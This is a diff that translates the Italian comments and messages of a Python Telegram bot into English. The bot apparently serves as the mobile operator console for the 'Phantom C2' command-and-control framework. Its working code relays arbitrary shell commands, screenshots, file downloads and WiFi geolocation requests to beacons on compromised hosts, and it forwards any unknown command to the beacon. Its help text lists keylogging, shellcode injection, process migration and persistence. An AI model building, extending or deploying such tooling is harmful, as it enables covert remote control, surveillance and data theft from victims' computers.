@@ -1,21 +1,21 @@
 """
-Telegram C2 bot — gestisci beacon da mobile via Telegram.
-Richiede: pip install python-telegram-bot
+Telegram C2 bot — manage beacons from mobile via Telegram.
+Requires: pip install python-telegram-bot
 
-Setup: @BotFather → /newbot → salva token in PHANTOM_TELEGRAM_BOT_TOKEN nel .env
+Setup: @BotFather → /newbot → save the token in PHANTOM_TELEGRAM_BOT_TOKEN in .env
 
-Comandi:
-  /start          — info bot e beacon attivi
-  /beacons        — lista beacon con stato
-  /interact <id>  — seleziona beacon per comandi
-  /sysinfo        — sysinfo del beacon attivo
+Commands:
+  /start          — bot info and active beacons
+  /beacons        — beacon list with status
+  /interact <id>  — select a beacon for commands
+  /sysinfo        — sysinfo of the active beacon
   /whoami         — whoami
-  /pwd            — directory corrente
-  /ls [path]      — listing directory
-  /shell <cmd>    — esegui comando shell
-  /screenshot     — screenshot (torna base64 via file Telegram)
-  /results        — risultati in attesa
-  /exit           — deseleziona beacon
+  /pwd            — current directory
+  /ls [path]      — directory listing
+  /shell <cmd>    — run a shell command
+  /screenshot     — screenshot (returns base64 as a Telegram file)
+  /results        — pending results
+  /exit           — deselect beacon
 """
 
 from __future__ import annotations
@@ -105,9 +105,9 @@ async def _cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     beacons = _api_get("/api/v1/beacons")
     n = len(beacons) if beacons else 0
     await update.message.reply_text(
-        f"Phantom C2 Bot 🤖\nBeacon attivi: {n}\n\n"
-        "/beacons — lista\n/interact &lt;id&gt; — seleziona\n"
-        "/help — tutti i comandi"
+        f"Phantom C2 Bot 🤖\nActive beacons: {n}\n\n"
+        "/beacons — list\n/interact &lt;id&gt; — select\n"
+        "/help — all commands"
     )
 
 
@@ -123,7 +123,7 @@ def _get_beacon_list() -> tuple[dict, list]:
 async def _cmd_beacons(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     beacons, ids = _get_beacon_list()
     if not ids:
-        await update.message.reply_text("Nessun beacon attivo.")
+        await update.message.reply_text("No active beacon.")
         return
     lines = []
     for i, bid in enumerate(ids, 1):
@@ -141,12 +141,12 @@ async def _cmd_interact(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     global active_beacon
     beacons, ids = _get_beacon_list()
     if not ids:
-        await update.message.reply_text("Nessun beacon attivo.")
+        await update.message.reply_text("No active beacon.")
         return
 
     if not ctx.args:
-        # Nessun argomento — mostra lista numerata
-        lines = ["Beacon attivi. Scegli con /interact <numero>:\n"]
+        # No argument — show the numbered list
+        lines = ["Active beacons. Pick one with /interact <number>:\n"]
         for i, bid in enumerate(ids, 1):
             info = beacons[bid]
             sel = " ⬅️" if bid == active_beacon else ""
@@ -157,21 +157,21 @@ async def _cmd_interact(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     bid_arg = ctx.args[0]
 
-    # Se è un numero, seleziona per indice
+    # If it is a number, select by index
     if bid_arg.isdigit():
         idx = int(bid_arg) - 1
         if idx < 0 or idx >= len(ids):
-            await update.message.reply_text(f"Numero invalido. Usa 1-{len(ids)}.")
+            await update.message.reply_text(f"Invalid number. Use 1-{len(ids)}.")
             return
         bid = ids[idx]
     else:
-        # Match per ID parziale
+        # Match on a partial ID
         if bid_arg in beacons:
             bid = bid_arg
         else:
             match = [b for b in ids if b.startswith(bid_arg)]
             if not match:
-                await update.message.reply_text("Beacon non trovato. Usa /beacons per la lista.")
+                await update.message.reply_text("Beacon not found. Use /beacons for the list.")
                 return
             bid = match[0]
 
@@ -186,16 +186,16 @@ async def _cmd_interact(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 async def _cmd_exit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     global active_beacon
     active_beacon = None
-    await update.message.reply_text("Beacon deselezionato.")
+    await update.message.reply_text("Beacon deselected.")
 
 
 async def _cmd_results(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if not active_beacon:
-        await update.message.reply_text("Nessun beacon attivo. Usa /interact")
+        await update.message.reply_text("No active beacon. Use /interact")
         return
     r = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
     if not r or not r.get("results"):
-        await update.message.reply_text("Nessun risultato.")
+        await update.message.reply_text("No results.")
         return
     out = r["results"][-1].get("output", "")
     await update.message.reply_text(f"```\n{out[:3000]}\n```")
@@ -203,10 +203,10 @@ async def _cmd_results(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 async def _cmd_shell(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if not active_beacon:
-        await update.message.reply_text("Nessun beacon attivo.")
+        await update.message.reply_text("No active beacon.")
         return
     if not ctx.args:
-        await update.message.reply_text("Uso: /shell <comando>")
+        await update.message.reply_text("Usage: /shell <command>")
         return
     cmd = "shell " + " ".join(ctx.args)
     r0 = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
@@ -218,14 +218,14 @@ async def _cmd_shell(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 async def _cmd_screenshot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if not active_beacon:
-        await update.message.reply_text("Nessun beacon attivo.")
+        await update.message.reply_text("No active beacon.")
         return
     r0 = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
     n0 = len(r0.get("results", [])) if r0 else 0
     _api_post("/api/v1/queue", {"beacon_id": active_beacon, "command": "screenshot"})
     out = _wait_result(active_beacon, n0)
     if not out:
-        await update.message.reply_text("Timeout screenshot.")
+        await update.message.reply_text("Screenshot timed out.")
         return
     if out.startswith("SCREENSHOT_B64:"):
         b64 = out[len("SCREENSHOT_B64:"):]
@@ -235,14 +235,14 @@ async def _cmd_screenshot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             bio.name = "screenshot.bmp"
             await update.message.reply_photo(bio)
         except Exception:
-            await update.message.reply_text(f"Errore decode: {out[:200]}")
+            await update.message.reply_text(f"Decode error: {out[:200]}")
     else:
         await update.message.reply_text(f"```\n{out[:2000]}\n```")
 
 
 async def _cmd_wlan_locate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if not active_beacon:
-        await update.message.reply_text("Nessun beacon attivo. Usa /interact")
+        await update.message.reply_text("No active beacon. Use /interact")
         return
     r0 = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
     n0 = len(r0.get("results", [])) if r0 else 0
@@ -253,10 +253,10 @@ async def _cmd_wlan_locate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 async def _cmd_download(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if not active_beacon:
-        await update.message.reply_text("Nessun beacon attivo.")
+        await update.message.reply_text("No active beacon.")
         return
     if not ctx.args:
-        await update.message.reply_text("Uso: /download <filepath>")
+        await update.message.reply_text("Usage: /download <filepath>")
         return
     filepath = " ".join(ctx.args)
     r0 = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
@@ -264,7 +264,7 @@ async def _cmd_download(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     _api_post("/api/v1/queue", {"beacon_id": active_beacon, "command": f"download {filepath}"})
     out = _wait_result(active_beacon, n0, timeout=30)
     if not out:
-        await update.message.reply_text("Timeout download.")
+        await update.message.reply_text("Download timed out.")
         return
     if out.startswith("FILE_B64:"):
         b64 = out[len("FILE_B64:"):]
@@ -274,7 +274,7 @@ async def _cmd_download(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             bio.name = os.path.basename(filepath) or "file"
             await update.message.reply_document(bio)
         except Exception:
-            await update.message.reply_text(f"Errore decode: {out[:200]}")
+            await update.message.reply_text(f"Decode error: {out[:200]}")
     else:
         await update.message.reply_text(f"```\n{out[:2000]}\n```")
 
@@ -308,7 +308,7 @@ async def _format_and_reply(update: Update, out: str):
 async def _cmd_fallback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     """Catch-all: forward any unrecognized command to the beacon."""
     if not active_beacon:
-        await update.message.reply_text("Nessun beacon attivo. Usa /interact")
+        await update.message.reply_text("No active beacon. Use /interact")
         return
     cmd = update.message.text.lstrip("/")
     # Strip @botname if present
@@ -326,26 +326,26 @@ async def _cmd_fallback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 async def _cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     text = (
         "🤖 *Phantom C2 Bot*\n\n"
-        "*Gestione:*\n"
-        "/beacons — lista beacon\n"
-        "/interact `<id>` — seleziona beacon\n"
-        "/exit — deseleziona\n"
-        "/results — risultati recenti\n\n"
-        "*Comandi beacon:*\n"
-        "/sysinfo — info sistema\n"
-        "/whoami — utente\n"
-        "/pwd — directory\n"
-        "/cd `<path>` — cambio directory\n"
+        "*Management:*\n"
+        "/beacons — list beacons\n"
+        "/interact `<id>` — select a beacon\n"
+        "/exit — deselect\n"
+        "/results — recent results\n\n"
+        "*Beacon commands:*\n"
+        "/sysinfo — system info\n"
+        "/whoami — user\n"
+        "/pwd — working directory\n"
+        "/cd `<path>` — change directory\n"
         "/ls `[path]` — listing\n"
-        "/shell `<cmd>` — esegui comando\n"
+        "/shell `<cmd>` — run a command\n"
         "/keylog `<start|stop|status|dump>` — keylogger\n"
         "/inject `<pid>` `<base64>` — inject shellcode\n"
-        "/migrate `<base64>` — migra processo\n"
-        "/screenshot — cattura schermo\n"
-        "/download `<path>` — scarica file\n"
-        "/wlan-locate — geolocalizzazione WiFi (torna link Maps)\n"
-        "/persist — persistenza\n\n"
-        "Qualsiasi altro comando non riconosciuto viene inviato direttamente al beacon."
+        "/migrate `<base64>` — migrate process\n"
+        "/screenshot — screen capture\n"
+        "/download `<path>` — download a file\n"
+        "/wlan-locate — WiFi geolocation (returns a Maps link)\n"
+        "/persist — persistence\n\n"
+        "Any other unrecognized command is forwarded straight to the beacon."
     )
     await update.message.reply_text(text)
 
@@ -355,23 +355,23 @@ def _set_bot_commands(app):
     try:
         import asyncio
         commands = [
-            ("start", "Info bot e beacon attivi"),
-            ("beacons", "Lista beacon con stato"),
-            ("interact", "Seleziona beacon (o numero)"),
-            ("exit", "Deseleziona beacon"),
-            ("results", "Risultati recenti"),
-            ("sysinfo", "Info sistema beacon"),
-            ("whoami", "Utente beacon"),
-            ("pwd", "Directory corrente"),
-            ("cd", "Cambia directory"),
-            ("ls", "Lista directory"),
-            ("shell", "Esegui comando shell"),
+            ("start", "Bot info and active beacons"),
+            ("beacons", "Beacon list with status"),
+            ("interact", "Select a beacon (or number)"),
+            ("exit", "Deselect beacon"),
+            ("results", "Recent results"),
+            ("sysinfo", "Beacon system info"),
+            ("whoami", "Beacon user"),
+            ("pwd", "Current directory"),
+            ("cd", "Change directory"),
+            ("ls", "List a directory"),
+            ("shell", "Run a shell command"),
             ("keylog", "Keylogger start/stop/status/dump"),
-            ("wlan_locate", "Geolocalizzazione WiFi"),
-            ("screenshot", "Cattura schermo"),
-            ("download", "Scarica file"),
-            ("persist", "Persistenza"),
-            ("help", "Tutti i comandi"),
+            ("wlan_locate", "WiFi geolocation"),
+            ("screenshot", "Screen capture"),
+            ("download", "Download a file"),
+            ("persist", "Persistence"),
+            ("help", "All commands"),
         ]
         async def _set():
             await app.bot.set_my_commands(commands)
@@ -387,10 +387,10 @@ def start_bot():
     import asyncio
     global bot_app
     if not TELEGRAM_AVAILABLE:
-        logger.error("python-telegram-bot non installato. pip install python-telegram-bot")
+        logger.error("python-telegram-bot is not installed. pip install python-telegram-bot")
         return
     if not BOT_TOKEN:
-        logger.error("PHANTOM_TELEGRAM_BOT_TOKEN non impostato nel .env")
+        logger.error("PHANTOM_TELEGRAM_BOT_TOKEN is not set in .env")
         return
 
     try:
@@ -415,7 +415,7 @@ def start_bot():
 
         app.add_handler(MessageHandler(filters.COMMAND & (auth_filter or filters.ALL), _cmd_fallback))
 
-        logger.info("Telegram bot avviato.")
+        logger.info("Telegram bot started.")
         app.run_polling(allowed_updates=Update.ALL_TYPES, stop_signals=[], drop_pending_updates=True)
     except Exception as e:
         logger.error(f"Telegram bot error: {e}")
@@ -425,12 +425,12 @@ def start_bot():
 def run():
     global _bot_thread
     if _bot_thread and _bot_thread.is_alive():
-        print("[Telegram Bot] Già in esecuzione")
+        print("[Telegram Bot] Already running")
         return _bot_thread
     t = threading.Thread(target=start_bot, daemon=True)
     t.start()
     _bot_thread = t
-    print("[Telegram Bot] Avviato in background")
+    print("[Telegram Bot] Started in the background")
     return t
 
 
